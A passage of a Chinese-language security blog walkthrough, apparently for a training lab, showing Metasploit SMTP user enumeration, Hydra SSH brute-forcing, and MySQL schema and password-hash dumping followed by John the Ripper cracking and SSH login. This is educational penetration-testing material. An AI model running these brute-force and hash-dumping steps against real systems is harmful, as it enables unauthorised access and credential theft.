class="built_in">set</span> RHOSTS 10.10.116.38</span><br><span class="line"><span class="comment"># set RHOSTS [目标 IP]</span></span><br><span class="line"><span class="comment"># 设置目标IP</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt</span><br><span class="line"><span class="comment"># USER_FILE 选项设置单词列表的路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment"># 使用 smtp_enum 获得目标用户名，并退出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.116.38 ssh</span><br><span class="line"><span class="comment"># hydra -t 16 -l [目标用户名] -P [字典路径] -vV [目标 IP] ssh</span></span><br><span class="line"><span class="comment"># hydra	运行 Hydra 工具</span></span><br><span class="line"><span class="comment"># -t 16	设置每个目标的并发连接数为 16</span></span><br><span class="line"><span class="comment"># -vV	设置详细模式，显示每次尝试的用户名和密码组合</span></span><br><span class="line"><span class="comment"># ssh / 协议	设置要攻击的协议（在此为 SSH）</span></span><br><span class="line"><span class="comment"># 获得目标密码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh administrator@10.10.116.38</span><br><span class="line"><span class="comment"># 通过ssh [目标用户名]@[目标 IP] 登录获得文件</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+
+
+<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="什么是-MySQL？"><a href="#什么是-MySQL？" class="headerlink" title="什么是 MySQL？"></a>什么是 MySQL？</h3><p>MySQL 是一种基于结构化查询语言（SQL）的关系型数据库管理系统（RDBMS）。</p>
+<p>数据库：<br>数据库是一个持久化的、有组织的结构化数据集合。</p>
+<p>RDBMS：<br>RDBMS 是一种用于创建和管理基于关系模型的数据库的软件或服务。“关系型”意味着数据存储在表格中，每个表格通过“主键”或其他“键”因素与其他表格相关联。</p>
+<p>SQL：<br>MySQL 是最受欢迎的关系型数据库管理系统软件之一的品牌名称。它使用客户端-服务器模型。使用了一种语言，即结构化查询语言（SQL）。</p>
+<h3 id="MySQL-是如何工作的？"><a href="#MySQL-是如何工作的？" class="headerlink" title="MySQL 是如何工作的？"></a>MySQL 是如何工作的？</h3><p>作为一种关系型数据库管理系统（RDBMS），MySQL 由服务器和一些管理 MySQL 数据库的实用程序组成。</p>
+<p>服务器处理所有数据库指令，比如创建、编辑和访问数据。它接收并管理这些请求，并通过 MySQL 协议与客户端通信。整个过程可以分为以下几个步骤：</p>
+<p>MySQL 创建一个数据库用于存储和操作数据，并定义每个表之间的关系。<br>客户端通过 SQL 语句发出特定请求。<br>服务器响应客户端请求，返回所需的信息。</p>
+<h3 id="MySQL-可以运行在哪些系统上？"><a href="#MySQL-可以运行在哪些系统上？" class="headerlink" title="MySQL 可以运行在哪些系统上？"></a>MySQL 可以运行在哪些系统上？</h3><p>MySQL 可以在多种平台上运行，包括 Linux 和 Windows。它通常被用作许多大型网站的后端数据库，是 LAMP 技术栈的重要组成部分，其中包括：Linux、Apache、MySQL 和 PHP。</p>
+<br>
+
+
+
+
+
+<h2 id="MySQL-枚举"><a href="#MySQL-枚举" class="headerlink" title="MySQL 枚举"></a>MySQL 枚举</h2><h3 id="何时开始攻击-MySQL"><a href="#何时开始攻击-MySQL" class="headerlink" title="何时开始攻击 MySQL"></a>何时开始攻击 MySQL</h3><p>在获取服务器的初步信息时，MySQL通常不会是首选目标。可以尝试暴力破解默认账户密码，但如果没有其他信息，这可能是无奈之举</p>
+<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>通过枚举其他服务获得一些初始凭据，之后可以利用这些凭据对 MySQL 服务进行进一步的枚举和利用</p>
+<h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>需要在系统上安装MySQL客户端，以便连接到远程MySQL服务器。如果还未安装，可以使用命令 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install default-mysql-client </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进行安装客户端</p>
+<h3 id="替代方案"><a href="#替代方案" class="headerlink" title="替代方案"></a>替代方案</h3><p>在Metasploit中完成的所有操作也可以手动执行，或使用其他工具来完成。</p>
+<br>
+
+
+
+
+
+<h2 id="利用MySQL"><a href="#利用MySQL" class="headerlink" title="利用MySQL"></a>利用MySQL</h2><h3 id="知道什么？"><a href="#知道什么？" class="headerlink" title="知道什么？"></a>知道什么？</h3><p>MySQL服务器的凭据<br>正在运行的MySQL版本<br>数据库数量及其名称</p>
+<h3 id="关键术语"><a href="#关键术语" class="headerlink" title="关键术语"></a>关键术语</h3><p>Schema（模式）：</p>
+<p>在MySQL中，chema与数据库是同义词。可在MySQL的SQL语法中用“SCHEMA”替代“DATABASE”</p>
+<p>Hashes（哈希）：</p>
+<p>哈希，简单来说，是一种加密算法的产物，用来将可变长度的输入转换为固定长度的输出。</p>
+<p>在MySQL中，哈希可以以不同的方式使用。每个哈希都有一个唯一的ID，作为指向原始数据的指针。这种方式创建的索引比原始数据要小得多，使得数据能够更高效地被搜索和访问。</p>
+<p>密码哈希是存储密码的一种方式，避免将密码以明文格式保存。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install default-mysql-client</span><br><span class="line"><span class="comment"># 安装default-mysql-client</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line">msfupdate</span><br><span class="line"><span class="comment"># 启动更新Metasploit，搜索mysql_sql</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">search mysql_sql</span><br><span class="line">use auxiliary/admin/mysql/mysql_sql</span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 搜索使用mysql_sql模块，查看选项</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.84.215</span><br><span class="line"><span class="built_in">set</span> USERNAME root</span><br><span class="line"><span class="built_in">set</span> PASSWORD password</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 设置目标IP，目标用户名，密码</span></span><br><span class="line"><span class="comment"># 获取目标 MySQL 服务器的版本</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> SQL <span class="string">&quot;show databases&quot;</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 将 sql 选项更改列出目标服务器上的数据库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">back</span><br><span class="line">search mysql_schemadump</span><br><span class="line">use auxiliary/scanner/mysql/mysql_schemadump </span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 退回，搜索使用mysql_schemadump模块，查看选项</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.84.215</span><br><span class="line"><span class="built_in">set</span> USERNAME root</span><br><span class="line"><span class="built_in">set</span> PASSWORD password</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 设置目标IP，目标用户名，密码</span></span><br><span class="line"><span class="comment"># 获取目标表的名称</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">back</span><br><span class="line">search mysql_hashdump</span><br><span class="line">use auxiliary/scanner/mysql/mysql_hashdump</span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 退回，搜索使用mysql_schemadump模块，查看选项</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.84.215</span><br><span class="line"><span class="built_in">set</span> USERNAME root</span><br><span class="line"><span class="built_in">set</span> PASSWORD password</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 设置目标IP，目标用户名，密码</span></span><br><span class="line"><span class="comment"># 获取从数据库中转储的用户列表和哈希信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;carl:*EA031893AA21444B170FC2162A56978B8CEECE18&quot;</span> &gt; hash.txt</span><br><span class="line"><span class="comment"># 另启窗口，在本地存储数据库中转储的用户列表和哈希信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">john hash.txt</span><br><span class="line"><span class="comment"># 使用 John the Ripper 破解 hash.txt 文件中的密码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh carl@10.10.84.215</span><br><span class="line"><span class="comment"># 使用ssh进行连接即可</span></span><br></pre></td></tr></table></figure>
+
+
+<br>
+
+
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/2024/11/04/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD7/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <div class="trm-cover-date">
+                    <div class="trm-cover-day">04</div>
+                    <div class="trm-cover-month">2024/11</div>
+                </div>
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD/">
+                    基础技能
+                </a>
+            </div>
+            <h5>
+                <a href="/2024/11/04/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD7/" class="trm-anima-link">
+                    HTTP 详解
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/11/04</li>
+                <li>09:37</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/2024/11/02/%E5%B7%A5%E5%85%B7Enum4Linux/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <div class="trm-cover-date">
+                    <div class="trm-cover-day">02</div>
+                    <div class="trm-cover-month">2024/11</div>
+                </div>
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/%E5%B7%A5%E5%85%B7/">
+                    工具
+                </a>
+            </div>
+            <h5>
+                <a href="/2024/11/02/%E5%B7%A5%E5%85%B7Enum4Linux/" class="trm-anima-link">
+                    Enum4Linux
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/11/02</li>
+                <li>15:26</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-footer-card trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024 - 2024</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">CypherSun</span>
+        </div>
+    
+
+      
+
+    
+        <div class="trm-footer-item blog-run-long"></div>
+     
+
+     
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+            
+<div class="trm-fixed-container">
+    
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn hidden-md" data-title="单栏和双栏切换" onclick="asyncFun.switchSingleColumn()">
+            <i class="iconfont fas fa-arrows-alt-h"></i>
+        </div>
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+    <div class="trm-search-popup">
+        <div class="trm-search-wrapper">
+            <div class="form trm-search-form">
+                <div class="trm-search-input-icon">
+                    <i class="iconfont fas fa-search"></i>
+                </div>
+                <input class="trm-search-input" type="text" placeholder="搜索文章...">
+                <div class="trm-search-btn-close">
+                    <i class="iconfont fas fa-times"></i>
+                </div>
+            </div>
+            <div class="trm-search-result-container">
+                <div class="trm-search-empty">
+                    请输入关键词进行搜索
+                </div>
+            </div>
+            <div class="trm-search-footer">
+                <div class="trm-search-stats"></div>
+                <ul class="trm-search-commands">
+                    <li>
+                        <kbd class="command-palette-commands-key">
+                            <svg width="15" height="15" aria-label="Escape key" role="img">
+                                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
+                                    stroke-width="1.2">
+                                    <path
+                                        d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956">
+                                    </path>
+                                </g>
+                            </svg>
+                        </kbd>
+                        <span class="command-palette-Label">to close</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+  <!-- Plugin -->
+
+
+
+
+    
+<script src="https://unpkg.com/swup@2.0.19/dist/swup.min.js"></script>
+
+    
+<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="https://unpkg.com/hexo-theme-async@2.2.3/source/js/plugins/typing.js?v=2.2.3"></script>
+    
+
+    
+        
+<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+
+        <script src="https://unpkg.com/hexo-theme-async@2.2.3/source/js/plugins/local_search.js?v=2.2.3"></script>
+    
+
+    <!-- 数学公式 -->
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+    
+
+		
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+    <script data-swup-reload-script>
+        (function () {
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') {
+                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            }
+            else {
+                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+            }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+
+
+
+<script id="async-script" src="https://unpkg.com/hexo-theme-async@2.2.3/source/js/main.js?v=2.2.3"></script>
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+<script src="https://unpkg.com/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+
+</html>
